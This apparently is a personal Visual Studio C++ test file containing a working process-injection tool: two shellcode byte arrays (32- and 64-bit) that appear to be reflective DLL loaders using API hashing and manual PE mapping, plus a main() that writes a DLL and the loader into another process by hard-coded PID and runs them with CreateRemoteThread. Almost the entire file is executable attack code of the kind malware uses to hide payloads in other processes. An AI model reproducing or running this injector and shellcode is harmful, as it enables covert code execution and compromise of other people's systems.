// Test.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#pragma warning( disable : 2440 )
#include <iostream>
#include <Windows.h>
unsigned char data_x32[908] = {
	0x83, 0xEC, 0x30, 0x53, 0x55, 0x56, 0xBE, 0xDA, 0x16, 0xAF, 0x92, 0xC7, 0x44, 0x24, 0x24, 0x75,
	0x73, 0x65, 0x72, 0x57, 0xBA, 0x72, 0x60, 0x77, 0x74, 0xC7, 0x44, 0x24, 0x2C, 0x33, 0x32, 0x2E,
	0x64, 0x8B, 0xCE, 0x66, 0xC7, 0x44, 0x24, 0x30, 0x6C, 0x6C, 0xC6, 0x44, 0x24, 0x32, 0x00, 0xC7,
	0x44, 0x24, 0x34, 0x6D, 0x73, 0x76, 0x63, 0xC7, 0x44, 0x24, 0x38, 0x72, 0x74, 0x2E, 0x64, 0x66,
	0xC7, 0x44, 0x24, 0x3C, 0x6C, 0x6C, 0xC6, 0x44, 0x24, 0x3E, 0x00, 0xE8, 0x51, 0x02, 0x00, 0x00,
	0x8B, 0xD8, 0x8D, 0x44, 0x24, 0x28, 0x50, 0x89, 0x5C, 0x24, 0x18, 0xFF, 0xD3, 0x8D, 0x44, 0x24,
	0x34, 0x50, 0xFF, 0xD3, 0xBA, 0x6F, 0xE0, 0x53, 0xE5, 0x8B, 0xCE, 0xE8, 0x31, 0x02, 0x00, 0x00,
	0xBA, 0x7E, 0x8D, 0xA4, 0x52, 0x89, 0x44, 0x24, 0x1C, 0x8B, 0xCE, 0xE8, 0x21, 0x02, 0x00, 0x00,
	0xBA, 0x60, 0x9A, 0xC2, 0x55, 0xB9, 0x4F, 0x17, 0x9A, 0x3E, 0x8B, 0xF0, 0xE8, 0x10, 0x02, 0x00,
	0x00, 0x8B, 0x6C, 0x24, 0x44, 0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x89, 0x44, 0x24, 0x2C,
	0x8B, 0x5D, 0x3C, 0x03, 0xDD, 0x89, 0x5C, 0x24, 0x18, 0xFF, 0x73, 0x50, 0x6A, 0x00, 0xFF, 0xD6,
	0x8B, 0x73, 0x54, 0x8B, 0xF8, 0x89, 0x7C, 0x24, 0x20, 0x8B, 0xD5, 0x85, 0xF6, 0x74, 0x0F, 0x8B,
	0xCF, 0x2B, 0xCD, 0x8A, 0x02, 0x88, 0x04, 0x11, 0x42, 0x83, 0xEE, 0x01, 0x75, 0xF5, 0x0F, 0xB7,
	0x4B, 0x14, 0x0F, 0xB7, 0x6B, 0x06, 0x83, 0xC1, 0x2C, 0x85, 0xED, 0x74, 0x31, 0x8B, 0x44, 0x24,
	0x44, 0x03, 0xCB, 0x8B, 0x51, 0xF8, 0x4D, 0x8B, 0x31, 0x03, 0xD7, 0x8B, 0x59, 0xFC, 0x03, 0xF0,
	0x85, 0xDB, 0x74, 0x0F, 0x8A, 0x06, 0x88, 0x02, 0x42, 0x46, 0x83, 0xEB, 0x01, 0x75, 0xF5, 0x8B,
	0x44, 0x24, 0x44, 0x83, 0xC1, 0x28, 0x85, 0xED, 0x75, 0xD9, 0x8B, 0x5C, 0x24, 0x10, 0x8B, 0xB3,
	0x80, 0x00, 0x00, 0x00, 0x03, 0xF7, 0x89, 0x74, 0x24, 0x44, 0x83, 0x7E, 0x0C, 0x00, 0x74, 0x7E,
	0x8B, 0x46, 0x0C, 0x03, 0xC7, 0x50, 0xFF, 0x54, 0x24, 0x18, 0x8B, 0x6E, 0x10, 0x8B, 0x1E, 0x03,
	0xEF, 0x03, 0xDF, 0x89, 0x44, 0x24, 0x18, 0x83, 0x7D, 0x00, 0x00, 0x74, 0x50, 0x8B, 0xF0, 0x85,
	0xDB, 0x74, 0x22, 0x8B, 0x0B, 0x85, 0xC9, 0x79, 0x1C, 0x8B, 0x46, 0x3C, 0x0F, 0xB7, 0xC9, 0x8B,
	0x44, 0x30, 0x78, 0x2B, 0x4C, 0x30, 0x10, 0x8B, 0x44, 0x30, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04,
	0x30, 0x03, 0xC6, 0xEB, 0x0E, 0x8B, 0x45, 0x00, 0x83, 0xC0, 0x02, 0x03, 0xC7, 0x50, 0x56, 0xFF,
	0x54, 0x24, 0x24, 0x89, 0x45, 0x00, 0x83, 0xC5, 0x04, 0x85, 0xDB, 0x8D, 0x43, 0x04, 0x0F, 0x44,
	0xC3, 0x83, 0x7D, 0x00, 0x00, 0x8B, 0xD8, 0x75, 0xB6, 0x8B, 0x74, 0x24, 0x44, 0x83, 0xC6, 0x14,
	0x89, 0x74, 0x24, 0x44, 0x83, 0x7E, 0x0C, 0x00, 0x75, 0x86, 0x8B, 0x5C, 0x24, 0x10, 0x8B, 0xEF,
	0x2B, 0x6B, 0x34, 0x83, 0xBB, 0xA4, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xD1, 0x00, 0x00, 0x00,
	0x8B, 0xB3, 0xA0, 0x00, 0x00, 0x00, 0x03, 0xF7, 0x89, 0x74, 0x24, 0x44, 0x8D, 0x4E, 0x04, 0x8B,
	0x01, 0x89, 0x4C, 0x24, 0x14, 0x85, 0xC0, 0x0F, 0x84, 0xB4, 0x00, 0x00, 0x00, 0x8B, 0x16, 0x8D,
	0x5E, 0x08, 0x89, 0x5C, 0x24, 0x1C, 0x03, 0xD7, 0x8D, 0x58, 0xF8, 0xD1, 0xEB, 0x0F, 0x84, 0x83,
	0x00, 0x00, 0x00, 0x8B, 0x74, 0x24, 0x1C, 0x0F, 0xB7, 0x06, 0x4B, 0x89, 0x44, 0x24, 0x1C, 0x0F,
	0xB7, 0xC8, 0x66, 0xC1, 0xE8, 0x0C, 0x0F, 0xB7, 0xF8, 0x89, 0x7C, 0x24, 0x18, 0x66, 0x83, 0xF8,
	0x0A, 0x75, 0x0E, 0x8B, 0x44, 0x24, 0x1C, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x01, 0x2C, 0x10, 0xEB,
	0x40, 0x8B, 0x44, 0x24, 0x18, 0x66, 0x83, 0xF8, 0x03, 0x75, 0x0B, 0x81, 0xE1, 0xFF, 0x0F, 0x00,
	0x00, 0x01, 0x2C, 0x11, 0xEB, 0x2B, 0x33, 0xFF, 0x47, 0x66, 0x3B, 0xC7, 0x75, 0x11, 0x81, 0xE1,
	0xFF, 0x0F, 0x00, 0x00, 0x8B, 0xC5, 0xC1, 0xE8, 0x10, 0x66, 0x01, 0x04, 0x11, 0xEB, 0x12, 0x6A,
	0x02, 0x5F, 0x66, 0x3B, 0xC7, 0x75, 0x0A, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x66, 0x01, 0x2C,
	0x11, 0x6A, 0x02, 0x58, 0x03, 0xF0, 0x85, 0xDB, 0x75, 0x8D, 0x8B, 0x7C, 0x24, 0x20, 0x8B, 0x74,
	0x24, 0x44, 0x8B, 0x4C, 0x24, 0x14, 0x03, 0x31, 0x89, 0x74, 0x24, 0x44, 0x8D, 0x4E, 0x04, 0x8B,
	0x01, 0x89, 0x4C, 0x24, 0x14, 0x85, 0xC0, 0x0F, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0x8B, 0x5C, 0x24,
	0x10, 0x8B, 0x73, 0x28, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0xFF, 0x03, 0xF7, 0xFF, 0x54, 0x24, 0x30,
	0x33, 0xC0, 0x6A, 0x00, 0x40, 0x50, 0x57, 0xFF, 0xD6, 0x5F, 0x5E, 0x5D, 0x5B, 0x83, 0xC4, 0x30,
	0xC3, 0x83, 0xEC, 0x18, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C,
	0x57, 0x89, 0x54, 0x24, 0x20, 0x89, 0x4C, 0x24, 0x1C, 0x8B, 0x70, 0x0C, 0xE9, 0x9A, 0x00, 0x00,
	0x00, 0x8B, 0x56, 0x18, 0x33, 0xC9, 0x8B, 0x46, 0x30, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44,
	0x24, 0x18, 0x8B, 0x42, 0x3C, 0x89, 0x54, 0x24, 0x10, 0x8B, 0x44, 0x10, 0x78, 0x89, 0x44, 0x24,
	0x14, 0x85, 0xC0, 0x74, 0x76, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x23, 0x8B, 0x54,
	0x24, 0x18, 0x0F, 0xBE, 0x2C, 0x3A, 0xC1, 0xC9, 0x0D, 0x80, 0x3C, 0x3A, 0x61, 0x7C, 0x03, 0x83,
	0xC1, 0xE0, 0x03, 0xCD, 0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x54, 0x24, 0x10, 0x8B, 0x44, 0x24,
	0x14, 0x3B, 0x4C, 0x24, 0x1C, 0x75, 0x44, 0x8B, 0x6C, 0x10, 0x20, 0x33, 0xFF, 0x8B, 0x4C, 0x10,
	0x18, 0x03, 0xEA, 0x89, 0x4C, 0x24, 0x24, 0x85, 0xC9, 0x74, 0x30, 0x8B, 0x45, 0x00, 0x33, 0xDB,
	0x03, 0xC2, 0x8D, 0x6D, 0x04, 0x89, 0x44, 0x24, 0x18, 0x8B, 0xD0, 0x8A, 0x0A, 0xC1, 0xCB, 0x0D,
	0x0F, 0xBE, 0xC1, 0x03, 0xD8, 0x42, 0x84, 0xC9, 0x75, 0xF1, 0x8B, 0x54, 0x24, 0x10, 0x3B, 0x5C,
	0x24, 0x20, 0x74, 0x1B, 0x47, 0x3B, 0x7C, 0x24, 0x24, 0x72, 0xD0, 0x83, 0x7E, 0x18, 0x00, 0x0F,
	0x85, 0x5C, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83, 0xC4, 0x18, 0xC3, 0x8B,
	0x74, 0x24, 0x14, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x78, 0x0F, 0xB7, 0x0C, 0x10, 0x8B, 0x44,
	0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB
};

unsigned char data_x64[1037] = {
	0x56, 0x48, 0x89, 0xE6, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x23, 0x01, 0x00,
	0x00, 0x48, 0x89, 0xF4, 0x5E, 0xC3, 0xCC, 0xCC, 0xE9, 0xE3, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC,
	0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
	0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x10, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,
	0x00, 0x00, 0x8B, 0xEA, 0x8B, 0xF1, 0x45, 0x33, 0xF6, 0x4C, 0x8B, 0x40, 0x18, 0x4D, 0x8B, 0x50,
	0x10, 0x4D, 0x39, 0x72, 0x30, 0x0F, 0x84, 0xBB, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x4A, 0x30, 0x45,
	0x8B, 0xC6, 0x41, 0x0F, 0x10, 0x42, 0x58, 0x4D, 0x8B, 0x12, 0x49, 0x63, 0x41, 0x3C, 0xF3, 0x0F,
	0x7F, 0x04, 0x24, 0x46, 0x8B, 0x9C, 0x08, 0x88, 0x00, 0x00, 0x00, 0x45, 0x85, 0xDB, 0x74, 0xD1,
	0x48, 0x8B, 0x04, 0x24, 0x48, 0xC1, 0xE8, 0x10, 0x66, 0x44, 0x3B, 0xF0, 0x73, 0x24, 0x48, 0x8B,
	0x4C, 0x24, 0x08, 0x0F, 0xB7, 0xD0, 0x0F, 0xBE, 0x01, 0x41, 0xC1, 0xC8, 0x0D, 0x80, 0x39, 0x61,
	0x7C, 0x04, 0x41, 0x83, 0xC0, 0xE0, 0x44, 0x03, 0xC0, 0x48, 0xFF, 0xC1, 0x48, 0x83, 0xEA, 0x01,
	0x75, 0xE4, 0x44, 0x3B, 0xC6, 0x75, 0x9A, 0x4F, 0x8D, 0x04, 0x19, 0x45, 0x8B, 0xDE, 0x41, 0x8B,
	0x58, 0x20, 0x49, 0x03, 0xD9, 0x45, 0x39, 0x70, 0x18, 0x76, 0x86, 0x8B, 0x3B, 0x41, 0x8B, 0xD6,
	0x49, 0x03, 0xF9, 0x48, 0x8D, 0x5B, 0x04, 0x0F, 0xBE, 0x0F, 0x48, 0xFF, 0xC7, 0xC1, 0xCA, 0x0D,
	0x03, 0xD1, 0x84, 0xC9, 0x75, 0xF1, 0x3B, 0xD5, 0x74, 0x0E, 0x41, 0xFF, 0xC3, 0x45, 0x3B, 0x58,
	0x18, 0x72, 0xD8, 0xE9, 0x59, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x40, 0x24, 0x43, 0x8D, 0x0C, 0x1B,
	0x49, 0x03, 0xC1, 0x0F, 0xB7, 0x14, 0x01, 0x41, 0x8B, 0x48, 0x1C, 0x49, 0x03, 0xC9, 0x8B, 0x04,
	0x91, 0x49, 0x03, 0xC1, 0xEB, 0x02, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0x6C,
	0x24, 0x28, 0x48, 0x8B, 0x74, 0x24, 0x30, 0x48, 0x8B, 0x7C, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x10,
	0x41, 0x5E, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55,
	0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0xF1, 0xC7, 0x45,
	0xE0, 0x75, 0x73, 0x65, 0x72, 0x45, 0x33, 0xE4, 0xC7, 0x45, 0xE4, 0x33, 0x32, 0x2E, 0x64, 0xBB,
	0xDA, 0x16, 0xAF, 0x92, 0x66, 0xC7, 0x45, 0xE8, 0x6C, 0x6C, 0x8B, 0xCB, 0x44, 0x88, 0x65, 0xEA,
	0xBA, 0x72, 0x60, 0x77, 0x74, 0xC7, 0x45, 0xF0, 0x6D, 0x73, 0x76, 0x63, 0xC7, 0x45, 0xF4, 0x72,
	0x74, 0x2E, 0x64, 0x66, 0xC7, 0x45, 0xF8, 0x6C, 0x6C, 0x44, 0x88, 0x65, 0xFA, 0xE8, 0x8E, 0xFE,
	0xFF, 0xFF, 0x4C, 0x8B, 0xE8, 0x48, 0x8D, 0x4D, 0xE0, 0x41, 0xFF, 0xD5, 0x48, 0x8D, 0x4D, 0xF0,
	0x41, 0xFF, 0xD5, 0xBA, 0x6F, 0xE0, 0x53, 0xE5, 0x8B, 0xCB, 0xE8, 0x71, 0xFE, 0xFF, 0xFF, 0xBA,
	0x7E, 0x8D, 0xA4, 0x52, 0x48, 0x89, 0x45, 0x40, 0x8B, 0xCB, 0xE8, 0x61, 0xFE, 0xFF, 0xFF, 0xBA,
	0x60, 0x9A, 0xC2, 0x55, 0xB9, 0x4F, 0x17, 0x9A, 0x3E, 0x48, 0x8B, 0xD8, 0xE8, 0x4F, 0xFE, 0xFF,
	0xFF, 0x4C, 0x63, 0x7E, 0x3C, 0x45, 0x8D, 0x4C, 0x24, 0x40, 0x4C, 0x03, 0xFE, 0x48, 0x89, 0x45,
	0x50, 0x33, 0xC9, 0x4C, 0x89, 0x7D, 0x48, 0x41, 0xB8, 0x00, 0x30, 0x00, 0x00, 0x4C, 0x8B, 0xF0,
	0x41, 0x8B, 0x57, 0x50, 0xFF, 0xD3, 0x45, 0x8B, 0x47, 0x54, 0x45, 0x8D, 0x5C, 0x24, 0x01, 0x48,
	0x8B, 0xF8, 0x48, 0x8B, 0xD6, 0x4D, 0x85, 0xC0, 0x74, 0x10, 0x48, 0x2B, 0xC6, 0x8A, 0x0A, 0x88,
	0x0C, 0x10, 0x49, 0x03, 0xD3, 0x4D, 0x2B, 0xC3, 0x75, 0xF3, 0x41, 0x0F, 0xB7, 0x4F, 0x14, 0x45,
	0x0F, 0xB7, 0x4F, 0x06, 0x49, 0x03, 0xCF, 0x4D, 0x85, 0xC9, 0x74, 0x35, 0x48, 0x83, 0xC1, 0x2C,
	0x8B, 0x51, 0xF8, 0x4D, 0x2B, 0xCB, 0x44, 0x8B, 0x01, 0x48, 0x03, 0xD7, 0x44, 0x8B, 0x51, 0xFC,
	0x4C, 0x03, 0xC6, 0x4D, 0x85, 0xD2, 0x74, 0x10, 0x41, 0x8A, 0x00, 0x4D, 0x03, 0xC3, 0x88, 0x02,
	0x49, 0x03, 0xD3, 0x4D, 0x2B, 0xD3, 0x75, 0xF0, 0x48, 0x83, 0xC1, 0x28, 0x4D, 0x85, 0xC9, 0x75,
	0xCF, 0x41, 0x8B, 0x9F, 0x90, 0x00, 0x00, 0x00, 0x48, 0x03, 0xDF, 0x44, 0x39, 0x63, 0x0C, 0x0F,
	0x84, 0x9A, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x7D, 0x40, 0x8B, 0x4B, 0x0C, 0x48, 0x03, 0xCF, 0x41,
	0xFF, 0xD5, 0x8B, 0x33, 0x4C, 0x8B, 0xE0, 0x44, 0x8B, 0x73, 0x10, 0x48, 0x03, 0xF7, 0x4C, 0x03,
	0xF7, 0xEB, 0x58, 0x48, 0x85, 0xF6, 0x74, 0x2E, 0x48, 0x83, 0x3E, 0x00, 0x7D, 0x28, 0x49, 0x63,
	0x44, 0x24, 0x3C, 0x0F, 0xB7, 0x16, 0x42, 0x8B, 0x8C, 0x20, 0x88, 0x00, 0x00, 0x00, 0x42, 0x8B,
	0x44, 0x21, 0x10, 0x42, 0x8B, 0x4C, 0x21, 0x1C, 0x48, 0x2B, 0xD0, 0x49, 0x03, 0xCC, 0x8B, 0x04,
	0x91, 0x49, 0x03, 0xC4, 0xEB, 0x10, 0x49, 0x8B, 0x16, 0x49, 0x8B, 0xCC, 0x48, 0x83, 0xC2, 0x02,
	0x48, 0x03, 0xD7, 0x41, 0xFF, 0xD7, 0x49, 0x89, 0x06, 0x48, 0x8D, 0x46, 0x08, 0x49, 0x83, 0xC6,
	0x08, 0x48, 0x85, 0xF6, 0x48, 0x0F, 0x44, 0xC6, 0x48, 0x8B, 0xF0, 0x49, 0x83, 0x3E, 0x00, 0x75,
	0xA2, 0x48, 0x83, 0xC3, 0x14, 0x45, 0x33, 0xE4, 0x44, 0x39, 0x63, 0x0C, 0x0F, 0x85, 0x77, 0xFF,
	0xFF, 0xFF, 0x4C, 0x8B, 0x7D, 0x48, 0x45, 0x8D, 0x5C, 0x24, 0x01, 0x4C, 0x8B, 0x75, 0x50, 0x4C,
	0x8B, 0xD7, 0x4D, 0x2B, 0x57, 0x30, 0x45, 0x39, 0xA7, 0xB4, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xB3,
	0x00, 0x00, 0x00, 0x45, 0x8B, 0x87, 0xB0, 0x00, 0x00, 0x00, 0x4C, 0x03, 0xC7, 0x41, 0x8B, 0x40,
	0x04, 0x85, 0xC0, 0x0F, 0x84, 0x9D, 0x00, 0x00, 0x00, 0xBE, 0xFF, 0x0F, 0x00, 0x00, 0x41, 0xBD,
	0x02, 0x00, 0x00, 0x00, 0x41, 0x8B, 0x10, 0x49, 0x8D, 0x58, 0x08, 0x44, 0x8B, 0xC8, 0x48, 0x03,
	0xD7, 0x49, 0x83, 0xE9, 0x08, 0x49, 0xD1, 0xE9, 0x74, 0x69, 0x4D, 0x2B, 0xCB, 0x44, 0x0F, 0xB7,
	0x1B, 0x41, 0x0F, 0xB7, 0xC3, 0x41, 0x0F, 0xB7, 0xCB, 0x66, 0xC1, 0xE8, 0x0C, 0x66, 0x83, 0xF8,
	0x0A, 0x75, 0x0F, 0x4C, 0x23, 0xDE, 0x4D, 0x01, 0x14, 0x13, 0x41, 0xBB, 0x01, 0x00, 0x00, 0x00,
	0xEB, 0x39, 0x41, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x66, 0x83, 0xF8, 0x03, 0x75, 0x09, 0x48, 0x23,
	0xCE, 0x44, 0x01, 0x14, 0x11, 0xEB, 0x24, 0x66, 0x41, 0x3B, 0xC3, 0x75, 0x10, 0x48, 0x23, 0xCE,
	0x49, 0x8B, 0xC2, 0x48, 0xC1, 0xE8, 0x10, 0x66, 0x01, 0x04, 0x11, 0xEB, 0x0E, 0x66, 0x41, 0x3B,
	0xC5, 0x75, 0x08, 0x48, 0x23, 0xCE, 0x66, 0x44, 0x01, 0x14, 0x11, 0x49, 0x03, 0xDD, 0x4D, 0x85,
	0xC9, 0x75, 0x97, 0x41, 0x8B, 0x40, 0x04, 0x4C, 0x03, 0xC0, 0x41, 0x8B, 0x40, 0x04, 0x85, 0xC0,
	0x0F, 0x85, 0x6E, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x5F, 0x28, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48,
	0x83, 0xC9, 0xFF, 0x48, 0x03, 0xDF, 0x41, 0xFF, 0xD6, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0xCF, 0x41,
	0x8D, 0x50, 0x01, 0xFF, 0xD3, 0x48, 0x8B, 0x9C, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4,
	0x40, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0xC3
};
int main()
{
	HANDLE hProcess =OpenProcess(PROCESS_ALL_ACCESS, 0, 16724);
	HANDLE hFile=CreateFileA("C:\\Users\\23035\\Desktop\\Home\\C++\\CShellcode\\x64\\Debug\\TestDll.dll",GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD64 dllSize = GetFileSize(hFile, NULL);
	LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
	DWORD outSize = 0;
	SIZE_T uiHaveWrited = 0;
	ReadFile(hFile, dllBytes, dllSize, &outSize, NULL);
	ULONG_PTR uiDllFileBase = (ULONG_PTR)VirtualAllocEx(hProcess,NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, (LPVOID)uiDllFileBase, dllBytes, dllSize,&uiHaveWrited);
	LPVOID shellcodebase = VirtualAllocEx(hProcess,NULL, sizeof(data_x64), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, (LPVOID)shellcodebase , data_x64, sizeof(data_x64), &uiHaveWrited);
	CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)shellcodebase, (LPVOID)uiDllFileBase, NULL, NULL);
	return 0;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
